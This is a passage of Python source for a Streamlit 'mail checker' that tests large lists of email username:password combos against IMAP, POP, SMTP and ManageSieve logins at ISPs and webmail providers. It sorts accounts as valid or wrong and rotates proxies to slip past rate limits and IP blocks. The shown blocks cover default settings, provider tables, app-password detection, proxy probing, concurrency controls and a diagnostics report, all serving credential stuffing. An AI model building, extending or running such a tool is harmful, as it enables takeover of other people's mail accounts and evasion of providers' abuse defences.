# @@END 019 SETTING_DEFAULTS

# @@BLOCK 020 DEFAULT_CFG deps=019
def default_cfg() -> dict:
    """The config dict produced when EVERY settings widget sits on its default."""
    return {
        "MODE_NAME": "Normal",
        "PROTOCOLS": list(PROTOCOL_SELECTION_DEFAULT),
        "MAX_WORKERS_START": WORKERS_NORMAL,
        "MAX_WORKERS_MAX": max(WORKERS_NORMAL * 2, 50),
        "TIMEOUT": ATTEMPT_TIMEOUT_NORMAL,
        "ACCOUNT_DEADLINE": int(DEADLINE_NORMAL),
        "MAX_ACCOUNTS": 5000,
        "BLACKLIST_CF": BLACKLIST_CF_DEFAULT,
        "PROXY_MODE": "fallback",
        "RETRY_CONNECTION_FAILED": 1,
        "ALLOW_SELF_SIGNED": True,
        # TLS_STRICT stays False so the reset target matches ALLOW_SELF_SIGNED=True.
        # build_cfg() sets TLS_STRICT = not self_signed.
        "TLS_STRICT": False,
        "TRY_STARTTLS": True,
        "TRY_ALT_USERNAME": True,
        "CONFIRM_WRONG_ACROSS_HOSTS": True,
        "MAX_HOSTS_PER_DOMAIN": 3,
        "PROXY_TEST_FLIGHT": True,
        "SKIP_STRICT_APP_PROVIDERS": False,
        "DEBUG": True,
        "MIN_PROXY_SCORE": MIN_PROXY_SCORE_DEFAULT,
        "PROXY_PRECHECK_TIMEOUT": PROXY_PRECHECK_TIMEOUT_DEFAULT,
        "PROBE_TIMEOUT": int(PROBE_TIMEOUT_DEFAULT),
        "PROBE_TARGET": PROBE_TARGET_DEFAULT,
        "PROBE_STRICT": PROBE_STRICT_DEFAULT,
        "PROBE_MAX_TARGETS": PROBE_MAX_TARGETS_DEFAULT,
        "PROBE_SECOND_SCHEME": PROBE_SECOND_SCHEME_DEFAULT,
        "PROBER_IDLE_ENABLED": PROBER_IDLE_ENABLED_DEFAULT,
        "PROBE_SAMPLE_MAX": 0,
        "MAIL_SPOT_CHECK": MAIL_SPOT_CHECK_DEFAULT,
        "DEDUPE_PROXIES": DEDUPE_PROXIES_DEFAULT,
        "ALLOW_BLACKLIST_IPS": False,
        "QUARANTINE_407": True,
        "HOST_CONCURRENCY": HOST_CONCURRENCY_DEFAULT,
        "PROXY_IP_CONCURRENCY": PROXY_IP_CONCURRENCY_DEFAULT,
        "PROXY_SUBUSER_CONCURRENCY": PROXY_SUBUSER_CONCURRENCY_DEFAULT,
        "PROXY_CONCURRENCY": PROXY_CONCURRENCY_DEFAULT,
        "DIRECT_FIRST": False,
        "SAME_HOST_RETRIES": SAME_HOST_RETRIES_DEFAULT,
        "MAX_ROTATIONS": MAX_ROTATIONS_DEFAULT,
        "CHECK_PASS2": CHECK_PASS2_DEFAULT,
        "POOL_MODE": "all",
        "SELECTED_COUNTRIES": [],
        "SELECTED_MIX_COUNTRIES": [],
        "DYNAMIC_WORKER_SCALING": True,
        "CUSTOM_WHITELIST": [],
        "CUSTOM_BLACKLIST": [],
        "PROXY_FILE": "proxies.txt",
        "RESULTS_DIR": user_file("mail_results"),
        "CACHE_FILE": "domain_cache.json",
        "PROXY_META_FILE": "proxy_meta.json",
        "MAX_PROXY_TRIES": 2,
        "PROXY_CONNECT_TIMEOUT": 8.0,
        "FAST_MODE": False,
        "FAILURE_COOLDOWN": FAILURE_COOLDOWN_DEFAULT,
        "RANDOM_ROTATION": True,
        "GEO_CALL": False,
        "CONNECTION_HINT": "Auto",
        "SMTP_CHECK": False,
    }


def _safe_index(options, value, fallback=0):
    """Never let an absent default raise ValueError on a selectbox."""
    try:
        return list(options).index(value)
    except Exception:
        return fallback
# @@END 020 DEFAULT_CFG

# @@BLOCK 021 DOMAIN_TABLES deps=-
WEB_ONLY_HOSTS = {
    "secure.windstream.net",
    "webmail.windstream.net",
    "secure.suddenlink.net",
    "webmail.suddenlink.net",
    "secure.optimum.net",
}

DOMAIN_COUNTRY_HINTS = {
    "windstream.net": "United States",
    "kinetic.net": "United States",
    "mediacombb.net": "United States",
    "mchsi.com": "United States",
    "comcast.net": "United States",
    "cox.net": "United States",
    "charter.net": "United States",
    "spectrum.net": "United States",
    "suddenlink.net": "United States",
    "optimum.net": "United States",
    "optonline.net": "United States",
    "att.net": "United States",
    "sbcglobal.net": "United States",
    "bellsouth.net": "United States",
    "verizon.net": "United States",
    "frontier.com": "United States",
    "centurylink.net": "United States",
    "embarqmail.com": "United States",
    "earthlink.net": "United States",
    "breezeline.net": "United States",
    "armstrong.net": "United States",
    "gmail.com": "United States",
    "outlook.com": "United States",
    "yahoo.com": "United States",
}

APP_PASSWORD_DOMAINS = {
    "gmail.com", "googlemail.com",
    "yahoo.com", "ymail.com", "rocketmail.com", "yahoo.co.uk", "yahoo.fr",
    "yahoo.de", "yahoo.it", "yahoo.es", "yahoo.com.br",
    "aol.com",
}
_APP_PW_16 = re.compile(r"^[a-z]{16}$")
_APP_PW_SPACED = re.compile(r"^(?:[a-z]{4}\s){3}[a-z]{4}$")
# @@END 021 DOMAIN_TABLES

# @@BLOCK 022 EXCEPTION_TYPES deps=-
class ProxyAuthError(ConnectionError):
    """The PROXY rejected our CREDENTIALS (407). The mail host is still untested."""


class ProxyTransportError(ConnectionError):
    """The tunnel broke at the SOCKET level. Not a 407, not a mail verdict."""


class SmtpAuthError(ConnectionError):
    """A CLEAN 535 from submission. A real credential answer. CONFIRM-ONLY."""


class SmtpSoftError(ConnectionError):
    """530 Authentication Required, relay restriction, 504, 4xx greylist."""


class SieveAuthError(ConnectionError):
    """A clean NO from ManageSieve. A real credential answer. CONFIRM-ONLY."""


class SieveSoftError(ConnectionError):
    """ManageSieve said something inconclusive."""


class MsVerdict(Exception):
    """A DEFINITE Microsoft token verdict, carried out of verify_and_connect."""

    def __init__(self, verdict, detail=""):
        super().__init__(detail or verdict)
        self.verdict = verdict
        self.detail = detail or verdict
# @@END 022 EXCEPTION_TYPES

# @@BLOCK 023 SMALL_PREDICATES deps=-
# Decisiveness for note_verdict(), HIGH WINS - and it must be identical under
# status.py AND under the inline fallback, because status.PRIORITY is high-wins
# while the fallback's ST_PRIORITY is low-wins.  note_verdict() compared with
# `<`, so under status.py a later WRONG could never overwrite an earlier
# LOGIN_DROPPED, and a bare UNKNOWN always won.
_VERDICT_RANK = {
    WRONG: 90,
    VALID: 80,
    APP: 70,
    RBL: 60,
    LOGIN_DROPPED: 50,
    SMTP_FAILED: 46,
    DNS_FAILED: 45,
    UNKNOWN: 10,
}


def _is_proxy_auth_fail(msg) -> bool:
    """True when the PROXY ITSELF rejected us, as opposed to a transport failure."""
    m = (msg or "").lower()
    return ("407" in m
            or "proxy authentication required" in m
            or "socks5 authentication failed" in m
            or "socks authentication failed" in m)


def _timeout_kind(err) -> str:
    """'connect' | 'read' | ''."""
    low = str(err).lower()
    if "read operation timed out" in low:
        return "read"
    if "timed out" in low or "timeout" in low:
        return "connect"
    return ""


def _looks_like_app_password(pw) -> bool:
    p = (pw or "").strip()
    if not p:
        return False
    return bool(_APP_PW_16.match(p) or _APP_PW_SPACED.match(p))


def _wrong_detail_note(domain, password) -> str:
    """Honest labelling for the providers where WRONG is ambiguous."""
    d = (domain or "").lower().strip()
    if d in APP_PASSWORD_DOMAINS and not _looks_like_app_password(password):
        return " (may be correct - provider needs an APP PASSWORD for IMAP/POP/SMTP)"
    return ""


def _login_dropped_detail() -> str:
    """The honest readout for a server that answers then hangs up."""
    return ("server accepted LOGIN then closed the socket (* BYE) on every attempt "
            "- usually a rejected password or an app-password requirement; retry from "
            "a different IP or with an app password before discarding the combo")
# @@END 023 SMALL_PREDICATES

# @@BLOCK 024 ENGINE_STATE deps=-
@str_lit.cache_resource(show_spinner=False)
def _engine_state():
    _meta = {}
    try:
        if os.path.exists("proxy_meta.json"):
            with open("proxy_meta.json", encoding="utf-8") as _f:
                _meta = json.load(_f) or {}
    except Exception:
        _meta = {}
    return {
        # locks
        "cache_lock": threading.Lock(),
        "proxy_lock": threading.Lock(),
        "file_write_lock": threading.Lock(),
        "session_state_lock": threading.Lock(),
        "alive_pool_lock": threading.Lock(),
        "host_dns_lock": threading.Lock(),
        "proxy_quarantine_lock": threading.Lock(),
        "proxy_scheme_lock": threading.Lock(),
        "probe_stats_lock": threading.Lock(),
        "probe_log_lock": threading.Lock(),
        "probe_owner_lock": threading.Lock(),
        "rr_lock": threading.Lock(),
        "geo_lock": threading.Lock(),
        "public_ip_lock": threading.Lock(),
        "direct_geo_lock": threading.Lock(),
        "smtp_lock": threading.Lock(),
        "target_reach_lock": threading.Lock(),
        "helo_lock": threading.Lock(),
        # concurrency gates (persistent so a rerun cannot orphan them)
        "host_gate_lock": threading.Lock(),
        "host_gates": {},
        "ip_gates": {},
        "subuser_gates": {},
        "proxy_gate": None,
        # engine / proxy state
        "alive_pool": [],
        "consecutive_proxy_failures": defaultdict(int),
        "circuit_breaker_until": {},
        "failed_domain_cache": {},
        "host_dns_cache": {},
        "proxy_quarantine": set(),
        "strikes_407": defaultdict(int),
        "proxy_scheme": {},
        "probe_stats": {},
        "probe_log": [],
        "meta": _meta,
        "rr_index": 0,
        "rr_last": None,
        # caches that must not be rebuilt on every click
        "geo_cache": {},
        "public_ip": {"ip": "", "ts": 0.0},
        "direct_geo": {"ts": 0.0, "ip": "", "country": "Unknown",
                       "region": "Unknown", "vpn": "Auto"},
        "direct_isp": {"ts": 0.0, "isp": ""},
        "smtp_domain_cache": {},
        "target_reach": {"ts": 0.0, "rows": []},
        "selftest": {"ts": 0.0, "text": ""},
        "helo_name": {"name": "", "ts": 0.0},
        "mail_spot": {"ts": 0.0, "host": "", "port": 0, "ok": 0, "auth": 0,
                      "other": 0, "n": 0, "error": ""},
        # probe bookkeeping
        "probe_in_flight": False,
        "last_probe_ts": 0.0,
        "probe_runs": 0,
        "run_active": False,
        "probe_targets_override": [],
        "bootstrap_done": False,
        "first_probe_kicked": False,
        "process_start": time.time(),
        # STATE-backed so a Streamlit rerun cannot rebuild them EMPTY
        "startup_seen": set(),
        "startup_buffer": [],
        "startup_buffer_lock": threading.Lock(),
        "dns_cache": {},
        "persistent_valid_cache": {"ts": 0.0, "data": []},
        "prev_valid_cache": {"ts": 0.0, "data": set()},
        "geo_fail": {},
        "geo_last_call": {"ts": 0.0},
        "proxy_407_until": {},
        "diag_cache": {"ts": 0.0, "text": ""},
    }


STATE = _engine_state()

probe_stats = STATE["probe_stats"]
probe_stats_lock = STATE["probe_stats_lock"]
probe_log = STATE["probe_log"]
probe_log_lock = STATE["probe_log_lock"]
_PROBE_OWNER_LOCK = STATE["probe_owner_lock"]

_PROBE_REASON_LABEL = {
    "ok": "pass",
    "auth": "407 auth",
    "transport": "transport reset",
    "timeout": "timeout",
    "dead": "dead",
    "tcp": "tcp dead",
    "format": "bad format",
    "nosocks": "no PySocks",
    "blocked": "circuit-broken",
}
# @@END 024 ENGINE_STATE

# @@BLOCK 025 PROBE_TELEMETRY deps=024
def log_probe_event(msg):
    with probe_log_lock:
        probe_log.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        if len(probe_log) > 300:
            del probe_log[:-300]


def record_probe_result(proxy_str, ok, reason, latency_ms=0, target="",
                        scheme=None, error=""):
    if not proxy_str:
        return
    with probe_stats_lock:
        prev = probe_stats.get(proxy_str) or {}
        probe_stats[proxy_str] = {
            "ok": bool(ok),
            "reason": reason or ("ok" if ok else "dead"),
            "ts": time.time(),
            "latency_ms": int(latency_ms or 0),
            "target": target or "",
            "scheme": scheme,
            "error": (error or "")[:300],
            "attempts": int(prev.get("attempts", 0)) + 1,
            "first_seen": prev.get("first_seen") or time.time(),
        }
    STATE["last_probe_ts"] = time.time()


def probe_summary():
    """(passed, auth, timeout, dead) over the most recent probe of each node."""
    with probe_stats_lock:
        snap = list(probe_stats.values())
    passed = sum(1 for v in snap if v.get("ok"))
    auth = sum(1 for v in snap if not v.get("ok") and v.get("reason") == "auth")
    timeout = sum(1 for v in snap if not v.get("ok")
                  and v.get("reason") in ("timeout", "transport"))
    dead = sum(1 for v in snap if not v.get("ok")
               and v.get("reason") not in ("auth", "timeout", "transport"))
    return passed, auth, timeout, dead


def probe_reason_histogram():
    with probe_stats_lock:
        snap = list(probe_stats.values())
    hist = defaultdict(int)
    for v in snap:
        hist[v.get("reason") or "?"] += 1
    return dict(sorted(hist.items(), key=lambda kv: -kv[1]))


def clear_tunnel_cache():
    """Clearing the probe stats is what a re-probe actually needs."""
    with probe_stats_lock:
        probe_stats.clear()
# @@END 025 PROBE_TELEMETRY

# @@BLOCK 026 RUNTIME_HELPERS deps=024
def live_cfg():
    """The CURRENT run's config, readable from the long-lived daemon thread."""
    c = STATE.get("cfg")
    if c:
        return c
    return globals().get("CFG") or {}


def probe_timeout() -> float:
    try:
        return float(CFG.get("PROBE_TIMEOUT", PROBE_TIMEOUT_DEFAULT))
    except Exception:
        return PROBE_TIMEOUT_DEFAULT


def active_protocols():
    """The selected protocols, always non-empty, IMAP-first."""
    try:
        picked = [p for p in (CFG.get("PROTOCOLS") or []) if p in PROTOCOL_OPTIONS]
    except Exception:
        picked = []
    if not picked:
        picked = list(PROTOCOL_SELECTION_DEFAULT)
    return [p for p in PROTOCOL_OPTIONS if p in picked]


def protocol_flags():
    picked = set(active_protocols())
    return {
        "imap": PROTOCOL_IMAP in picked,
        "pop": PROTOCOL_POP in picked,
        "smtp": PROTOCOL_SMTP in picked,
        "sieve": PROTOCOL_SIEVE in picked,
    }


def probe_targets():
    """Targets for the tunnel probe."""
    try:
        name = CFG.get("PROBE_TARGET", PROBE_TARGET_DEFAULT)
    except Exception:
        name = PROBE_TARGET_DEFAULT
    if name == PROBE_TARGET_AUTO:
        ov = STATE.get("probe_targets_override") or []
        if ov:
            return list(ov)
        return PROBE_TARGET_PORTS[PROBE_TARGET_AUTO]
    return PROBE_TARGET_PORTS.get(name) or PROBE_TARGET_PORTS[PROBE_TARGET_AUTO]


def probe_workers(bulk: bool = False) -> int:
    try:
        if bulk:
            return max(1, int(PROBE_WORKERS_BULK))
        base = PROBE_WORKERS_BUSY if STATE.get("run_active") else PROBE_WORKERS_DEFAULT
        return max(1, int(base))
    except Exception:
        return PROBE_WORKERS_DEFAULT


def _estimated_rung_count():
    """How many rungs a typical account will actually dial."""
    try:
        flags = protocol_flags()
        n = 0
        if flags.get("imap"):
            n += 2
        if flags.get("pop"):
            n += 2
        if flags.get("smtp"):
            n += len(SMTP_RUNG_PORTS)
        if flags.get("sieve"):
            n += 1
        return max(1, n)
    except Exception:
        return 8


def request_budget():
    """Rough proxy-request accounting under the CURRENT settings."""
    try:
        nodes = len(all_proxies)
    except Exception:
        nodes = 0
    per_node = 1 + (1 if CFG.get("PROBE_SECOND_SCHEME",
                                 PROBE_SECOND_SCHEME_DEFAULT) else 0)
    per_node *= max(1, int(CFG.get("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT)))
    try:
        sample = max(0, int(CFG.get("PROBE_SAMPLE_MAX", 0)))
    except Exception:
        sample = 0
    probed = min(nodes, sample) if sample else nodes
    cycle = probed * per_node
    if CFG.get("MAIL_SPOT_CHECK", MAIL_SPOT_CHECK_DEFAULT):
        cycle += min(MAIL_SPOT_NODES, probed)
    if CFG.get("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT):
        idle_per_min = cycle / max(1.0, PROBER_IDLE_SLEEP) * 60.0
    else:
        idle_per_min = 0.0
    rungs = _estimated_rung_count()
    rot = max(1, int(CFG.get("MAX_ROTATIONS", MAX_ROTATIONS_DEFAULT)) + 1)
    passes = 2 if CFG.get("CHECK_PASS2", CHECK_PASS2_DEFAULT) else 1
    return {"cycle": cycle, "idle_per_min": idle_per_min,
            "per_account": rungs * passes * rot * per_node}
# @@END 026 RUNTIME_HELPERS

# @@BLOCK 027 DIAG_ENV deps=-
def _env_info():
    info = {}
    info["python"] = sys.version.replace("\n", " ").strip()
    info["platform"] = platform.platform()
    info["machine"] = platform.machine()
    info["cwd"] = os.getcwd()
    try:
        info["streamlit"] = getattr(str_lit, "__version__", "unknown")
    except Exception:
        info["streamlit"] = "unknown"
    try:
        info["pandas"] = pd.__version__
    except Exception:
        info["pandas"] = "unknown"
    try:
        info["imaplib"] = getattr(imaplib, "__version__", "unknown")
    except Exception:
        info["imaplib"] = "unknown"
    try:
        import socks as _s
        info["pysocks"] = getattr(_s, "__version__", "present(no __version__)")
    except Exception:
        info["pysocks"] = "MISSING"
    try:
        import requests as _r
        info["requests"] = getattr(_r, "__version__", "present")
    except Exception:
        info["requests"] = "MISSING"
    try:
        import dns as _d
        info["dnspython"] = getattr(_d, "version", None) and str(_d.version.version) or "present"
    except Exception:
        info["dnspython"] = "MISSING"
    info["socks_ok_flag"] = SOCKS_OK
    info["hosts_ok"] = HOSTS_OK
    info["hosts_merge"] = _HAVE_HOSTS_MERGE
    info["status_ok"] = STATUS_OK
    info["ms_oauth_ok"] = MS_OAUTH_OK
    info["cfg_version"] = CFG_VERSION
    for f in ("proxies.txt", "proxies_all.txt", "proxy_meta.json", "theme.json",
              "domain_cache.json"):
        try:
            if os.path.exists(f):
                stt = os.stat(f)
                info[f] = (f"{stt.st_size} bytes, mtime "
                           f"{datetime.fromtimestamp(stt.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}")
            else:
                info[f] = "ABSENT"
        except Exception as e:
            info[f] = f"stat error: {e}"
    return info


def _e_for(fn):
    try:
        fn()
        return Exception("no error")
    except Exception as e:
        return e


def _imap_caps_selftest():
    """The exact v13.31 crash, replayed on a fake connection."""
    class _Fake:
        def __init__(self, caps):
            self.capabilities = caps

        def capability(self):
            return "OK", [b"IMAP4REV1 AUTH=PLAIN LOGINDISABLED"]

    lines = []
    cases = {
        "str tuple (what CPython 3.x really gives)": ("IMAP4REV1", "AUTH=PLAIN", "LOGINDISABLED"),
        "bytes tuple (what v13.31 assumed)": (b"IMAP4REV1", b"AUTH=PLAIN", b"LOGINDISABLED"),
        "empty tuple (forces the capability() call)": (),
        "None": None,
        "single str (not a tuple)": "IMAP4REV1 AUTH=PLAIN",
    }
    for label, caps in cases.items():
        try:
            m = _Fake(caps)
            got = sorted(_imap_caps(m))
            wants = "LOGINDISABLED" in got
            verdict = "wants AUTHENTICATE PLAIN" if wants else "will use LOGIN"
            lines.append(f"  OK   {label:46} -> caps={len(got):2} {verdict}")
        except Exception as e:
            lines.append(f"  FAIL {label:46} -> {type(e).__name__}: {e}")
    try:
        lines.append("  repro: b' '.join(str tuple) raises "
                     f"{type(_e_for(lambda: b' '.join(('IMAP4REV1',)))).__name__}")
    except Exception:
        pass
    return lines


def _probe_target_reachability(force=False):
    now = time.time()
    with STATE["target_reach_lock"]:
        cached = STATE.get("target_reach") or {}
        if not force and cached.get("rows") and (now - cached.get("ts", 0)) < 300:
            return cached["rows"]
    rows = []
    for host, port, label in PROBE_TARGET_PORTS["both (either)"]:
        row = {"target": f"{host}:{port}", "label": label}
        t0 = time.time()
        try:
            s = socket.create_connection((host, int(port)), timeout=3.0)
            s.close()
            row["ok"] = True
            row["ms"] = int((time.time() - t0) * 1000)
            row["err"] = ""
        except Exception as e:
            row["ok"] = False
            row["ms"] = int((time.time() - t0) * 1000)
            row["err"] = f"{type(e).__name__}: {str(e)[:120]}"
        try:
            row["resolved"] = socket.gethostbyname(host)
        except Exception as e:
            row["resolved"] = f"DNS FAIL {type(e).__name__}"
        rows.append(row)
    with STATE["target_reach_lock"]:
        STATE["target_reach"] = {"ts": now, "rows": rows}
    return rows
# @@END 027 DIAG_ENV

# @@BLOCK 028 DIAG_PROXY_AUDIT deps=-
def _detect_line_format(line):
    p = (line or "").strip()
    if not p:
        return "empty"
    if "://" in p:
        return "scheme:// (url form)"
    if "@" in p:
        return "user:pass@host:port"
    parts = p.split(":")
    if len(parts) == 4:
        return "host:port:user:pass"
    if len(parts) == 2:
        return "host:port (NO CREDS)"
    return f"UNRECOGNISED ({len(parts)} colon-parts)"


def _analyze_proxy_file():
    out = {"exists": False, "total": 0, "unique": 0, "with_creds": 0,
           "unparsable": 0, "formats": {}, "dupe_map": {}, "sample": [],
           "distinct_ips": 0, "distinct_users": 0}
    try:
        if not os.path.exists("proxies.txt"):
            return out
        out["exists"] = True
        with open("proxies.txt", encoding="utf-8", errors="ignore") as f:
            raw = [l.rstrip("\n") for l in f]
        lines = [l.strip() for l in raw if l.strip() and not l.startswith("#")]
        out["total"] = len(lines)
        out["unique"] = len(list(dict.fromkeys(lines)))
        out["sample"] = lines[:10]
        ips, users = set(), set()
        for l in lines:
            fmt = _detect_line_format(l)
            out["formats"][fmt] = out["formats"].get(fmt, 0) + 1
            if "@" in l:
                out["with_creds"] += 1
            info = parse_proxy(l)
            if not info:
                out["unparsable"] += 1
                continue
            ips.add(info["host"])
            if info.get("user"):
                users.add(info["user"])
            hp = f"{info['host']}:{info['port']}"
            out["dupe_map"][hp] = out["dupe_map"].get(hp, 0) + 1
        out["distinct_ips"] = len(ips)
        out["distinct_users"] = len(users)
    except Exception as e:
        out["error"] = str(e)
    return out
# @@END 028 DIAG_PROXY_AUDIT

# @@BLOCK 029 DIAG_THREADS deps=-
def _thread_report():
    return [f"{t.name} | daemon={t.daemon} | alive={t.is_alive()}"
            for t in threading.enumerate()]


def _thread_stats():
    names = [t.name for t in threading.enumerate()]
    return {
        "total": len(names),
        "executor": sum(1 for n in names if n.startswith("ThreadPoolExecutor")),
        "scriptrunner": sum(1 for n in names if "ScriptRunner" in n),
        "alivepool": sum(1 for n in names if n == "alive-pool"),
        "firstprobe": sum(1 for n in names if n == "first-probe"),
        "startrefresh": sum(1 for n in names if n == "start-refresh"),
    }
# @@END 029 DIAG_THREADS

# @@BLOCK 030 DIAG_BUNDLE deps=025,027,028,029
def build_diagnostics_text():
    L = []

    def A(s=""):
        L.append(str(s))

    A("=" * 78)
    A(f"MEGA ULTIMATE MAIL CHECKER - {BUILD_TAG} DIAGNOSTIC BUNDLE")
    A(f"generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    A("=" * 78)

    A("")
    A("--- 0. IF YOU SEE 'TypeError: Importing a module script failed.' ---")
    A("  That string is SAFARI / iOS WebView's message for a DYNAMIC JAVASCRIPT")
    A("  CHUNK that failed to load.  Streamlit lazy-loads chunks with a content")
    A("  hash in the filename, so a redeploy changes every hash and an already-open")
    A("  tab keeps requesting the OLD names -> 404 -> one red box per failed chunk.")
    A("  NOT a Python error, NOT app.py.  FIX: hard-refresh (Ctrl/Cmd+Shift+R).")

    A("")
    A("--- 1. ENVIRONMENT ---")
    for k, v in _env_info().items():
        A(f"  {k:16}: {v}")
    A("  imaplib caps   : _get_capabilities() decodes with str(dat[-1], enc) "
      "=> mail.capabilities is a tuple of STR on CPython 3.x")

    A("")
    A("--- 1b. _imap_caps() REGRESSION SELF-TEST ---")
    for line in _imap_caps_selftest():
        A(line)

    A("")
    A("--- 1c. * BYE CLASSIFIER SELF-TEST ---")
    for _raw, _want in (
        ("command: LOGIN => IMAP server terminating connection", LOGIN_DROPPED),
        ("* BYE Connection is closed", LOGIN_DROPPED),
        ("* BYE Auth process broken", LOGIN_DROPPED),
        ("* BYE Too many simultaneous connections", RETRY_LATER),
        ("* BYE Too many invalid IMAP commands", RETRY_LATER),
        ("socket error: timed out", CONNECTION_FAILED),
        ("connection reset by peer", CONNECTION_FAILED),
        ("NO [AUTHENTICATIONFAILED] Invalid credentials", WRONG_PASSWORD),
        ("Socket error: 407: Proxy Authentication Required", CONNECTION_FAILED),
    ):
        try:
            _got = st_classify(_raw)
        except Exception as _ce:
            _got = f"<{_ce}>"
        A(f"  {'OK  ' if _got == _want else 'FAIL'} {_raw[:52]:54} -> {_got}"
          f"{'' if _got == _want else f'  (wanted {_want})'}")

    A("")
    A("--- 2. ACTIVE CONFIG (CFG) ---")
    try:
        for k in sorted(CFG.keys()):
            A(f"  {k:28}: {CFG.get(k)}")
    except Exception as e:
        A(f"  CFG unavailable: {e}")

    A("")
    A("--- 3. PROXY FILE AUDIT (proxies.txt) ---")
    fa = _analyze_proxy_file()
    A(f"  exists            : {fa.get('exists')}")
    A(f"  total lines       : {fa.get('total')}")
    A(f"  unique lines      : {fa.get('unique')}")
    A(f"  DISTINCT IPs      : {fa.get('distinct_ips')}   <-- the number that matters")
    A(f"  DISTINCT users    : {fa.get('distinct_users')}   <-- the 407 limit is per USER")
    A(f"  lines with '@'    : {fa.get('with_creds')}")
    A(f"  unparsable lines  : {fa.get('unparsable')}")
    A(f"  detected formats  : {fa.get('formats')}")
    A(f"  error             : {fa.get('error', '-')}")
    A("  -- first 10 lines VERBATIM --")
    for i, l in enumerate(fa.get("sample") or []):
        A(f"    [{i}] {l}")
    A("  -- host:port -> how many lines reference it (top 20) --")
    dm = sorted((fa.get("dupe_map") or {}).items(), key=lambda kv: -kv[1])[:20]
    if dm:
        for hp, n in dm:
            A(f"    {hp:28} x{n}")
    else:
        A("    (none parsed)")
    try:
        if os.path.exists("proxies_all.txt"):
            with open("proxies_all.txt", encoding="utf-8", errors="ignore") as _pa:
                A(f"  proxies_all.txt   : {sum(1 for l in _pa if l.strip())} raw line(s) backed up")
        else:
            A("  proxies_all.txt   : ABSENT (written by the next Fetch & Test)")
    except Exception as _pae:
        A(f"  proxies_all.txt   : stat error {_pae}")

    A("")
    A("--- 4. PROBE-TARGET REACHABILITY FROM THIS APP HOST (direct, no proxy) ---")
    for r in _probe_target_reachability():
        A(f"  {r['target']:24} resolved={r.get('resolved', '?'):18} "
          f"tcp={'OK' if r['ok'] else 'FAIL'} {r['ms']}ms {r['err']}")

    A("")
    A("--- 5. EGRESS IDENTITY (this app host) ---")
    try:
        g = direct_geo()
        A(f"  ip={g.get('ip')} country={g.get('country')} "
          f"region={g.get('region')} vpn={g.get('vpn')}")
        A(f"  isp={direct_isp()[:120]}")
    except Exception as e:
        A(f"  geo error: {e}")

    A("")
    A("--- 6. POOL STATE ---")
    A(f"  selected protocols  : {active_protocols()}")
    A(f"  loaded proxies      : {len(all_proxies)}")
    A(f"  filtered pool       : {len(filtered_pool)}")
    A(f"  alive pool          : {len(alive_pool)}")
    A(f"  quarantined (407)   : {quarantine_size()}")
    A(f"  probe_in_flight     : {STATE.get('probe_in_flight')}")
    A(f"  probe lock held     : {_PROBE_OWNER_LOCK.locked()}")
    A(f"  first_probe_kicked  : {STATE.get('first_probe_kicked')}")
    A(f"  run_active          : {STATE.get('run_active')}")
    A(f"  probe_runs          : {STATE.get('probe_runs')}")
    A(f"  CONFIRM_WRONG_ACROSS_HOSTS: {CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')}")
    A(f"  ALLOW_SELF_SIGNED / TLS_STRICT: "
      f"{CFG.get('ALLOW_SELF_SIGNED')} / {CFG.get('TLS_STRICT')}")
    _lp = STATE.get("last_probe_ts", 0.0)
    A(f"  last_probe         : {int(time.time() - _lp)}s ago" if _lp else "  last_probe         : never")
    A(f"  process uptime     : {int(time.time() - STATE.get('process_start', time.time()))}s")
    A(f"  probe target/budget: {CFG.get('PROBE_TARGET')} / {probe_timeout():.0f}s "
      f"/ strict={CFG.get('PROBE_STRICT')}")
    A(f"  probe targets(live): {[t[0] + ':' + str(t[1]) for t in probe_targets()]}")
    A(f"  probe workers      : {probe_workers()} idle/run, {probe_workers(bulk=True)} bulk "
      f"(batch budget {PROBE_BATCH_BUDGET:.0f}s)")
    _ms = STATE.get("mail_spot") or {}
    if _ms.get("n"):
        A(f"  MAIL-DEST SPOT      : {_ms['host']}:{_ms['port']} -> pass={_ms['ok']} "
          f"407={_ms['auth']} other={_ms['other']} of {_ms['n']} node(s), "
          f"{int(time.time() - _ms.get('ts', 0))}s ago")
        if _ms.get("auth") and not _ms.get("ok"):
            A("  *** pool passes the WEB probe but the provider 407s MAIL destinations ***")
        if _ms.get("error"):
            A(f"  spot error          : {_ms['error'][:200]}")
    else:
        A("  MAIL-DEST SPOT      : not run yet")
    A(f"  HOST_CONCURRENCY    : {CFG.get('HOST_CONCURRENCY')}")
    A(f"  PROXY_CONCURRENCY   : {CFG.get('PROXY_CONCURRENCY')}")
    A(f"  PROXY_IP_CONCURRENCY: {CFG.get('PROXY_IP_CONCURRENCY')}")
    A(f"  PROXY_SUBUSER_CONC  : {CFG.get('PROXY_SUBUSER_CONCURRENCY')}   <-- 407 control")
    _rb = request_budget()
    A(f"  REQUEST BUDGET      : ~{_rb['per_account']} proxy req/account - "
      f"{_rb['idle_per_min']:.0f}/min idle probing - {_rb['cycle']} per pool cycle")
    A(f"  PROBE_MAX_TARGETS   : {CFG.get('PROBE_MAX_TARGETS')}")
    A(f"  PROBE_SECOND_SCHEME : {CFG.get('PROBE_SECOND_SCHEME')}")
    A(f"  PROBER_IDLE_ENABLED : {CFG.get('PROBER_IDLE_ENABLED')}")
    A(f"  PROBE_SAMPLE_MAX    : {CFG.get('PROBE_SAMPLE_MAX')}")
    A(f"  MAIL_SPOT_CHECK     : {CFG.get('MAIL_SPOT_CHECK')}")
    A(f"  MAX_ROTATIONS       : {CFG.get('MAX_ROTATIONS')}")
    A(f"  CHECK_PASS2         : {CFG.get('CHECK_PASS2')}")
    A(f"  DIRECT_FIRST        : {CFG.get('DIRECT_FIRST')}")
    A(f"  RANDOM_ROTATION     : {CFG.get('RANDOM_ROTATION')}")
    A(f"  CONNECT_FLOOR/READ  : {CONNECT_FLOOR_DEFAULT} / {READ_FLOOR_DEFAULT}")
    A(f"  LEGACY RUNG LEASH   : {LEGACY_RUNG_TIMEOUT}s on ports {LEGACY_PORTS}")
    A(f"  407 CONTRACT        : quarantine={PROXY_407_QUARANTINE} "
      f"force_direct={PROXY_407_FORCE_DIRECT} cooldown={PROXY_407_COOLDOWN:.0f}s "
      f"same_host_retries={CFG.get('SAME_HOST_RETRIES')}")
    A(f"  HELO name           : {smtp_helo_name()}")

    A("")
